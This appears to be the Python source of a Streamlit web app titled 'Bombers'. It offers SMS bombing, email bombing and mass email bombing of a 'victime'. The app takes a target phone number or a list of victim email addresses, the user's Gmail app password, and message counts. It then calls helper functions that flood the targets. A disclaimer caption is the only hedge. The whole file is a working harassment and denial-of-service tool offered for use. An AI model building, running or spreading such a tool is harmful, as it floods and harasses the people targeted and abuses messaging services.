import streamlit as st
from helpers.smshelper import get_phone_info, selectnode
from helpers.emailhelper import email_bombing
from helpers.system_logs import platform_details
from helpers.mass_emailhelper import mass_email_bombing
import preprocessor


max_limit = {"sms": 1000, "call": 15, "mail": 200}


def agreement_accepting():

    return st.caption("By using this webapp :green[you accept] that This application must not be used to cause :red[harm/discomfort/trouble] to :blue[others]. Developers of this webapp are not responsible for your actions." )



st.sidebar.title("Bombers")


bomber_options = ["SMS Bombing", "Email Bombing", "Mass Email Bombing"]
user_bomber_select = st.sidebar.selectbox("Select Your Bombing Technique: ", options=bomber_options)


if user_bomber_select == bomber_options[0]:
    st.title(user_bomber_select)

    country_code = st.number_input("Enter Your Country Code Without + sign: ", step=1, value=91)
    phone_number = st.number_input("Enter The Phone Number: ", step=1)
    sms_count = st.number_input("Enter the number of messages you want to send (max: 500): ", step=1, min_value=1, max_value=500)
    delay = st.number_input("Enter the delay time: (min: 5)", step=1, min_value=5)
    
    threads = (sms_count//10) if (sms_count//10) > 0 else 1

    agreement_accepting()

    if st.button("Start Bombing"):
        status = get_phone_info(country_code, phone_number)

        if status["status"] != "valid":
            st.warning(status["message"])
        else:
            result = selectnode(str(country_code), str(phone_number), sms_count, delay, int(threads))
            st.success(result["status"])
            st.json(result)
            st.json(platform_details())



elif user_bomber_select == bomber_options[1]:
    st.title(user_bomber_select)

    email = st.text_input("Enter Your Gmail Id: ")
    password = st.text_input("Enter your Gmail App Password: ")
    victime_email = st.text_input("Enter Your Victime Gmail Id: ")
    message = st.text_area("Enter your Message:")
    message_relode = st.number_input("How many message you want to send to an email id: ", step=1, min_value=1)

    agreement_accepting()

    if st.button("Start Bombing"):
        result = email_bombing(victime_email, email, password, message, message_relode)
        st.success(result)
        st.json(platform_details())

elif user_bomber_select == bomber_options[2]:
    st.title(user_bomber_select)

    victime_email = st.file_uploader("Upload Your Victime Gmail Id list: " ,type=["txt"])

    if victime_email is not None:

        file_data = victime_email.getvalue().decode("utf-8")

        email = st.text_input("Enter Your Gmail Id: ")
        password = st.text_input("Enter your Gmail App Password: ")
        message = st.text_area("Enter your Message:")
        message_relode = st.number_input("How many message you want to send to each individual email: ", step=1, min_value=1)

        agreement_accepting()
        
        if st.button("Start Bombing"):

            result = mass_email_bombing(file_data, email, password, message, message_relode)
            st.success(result)
            st.json(platform_details())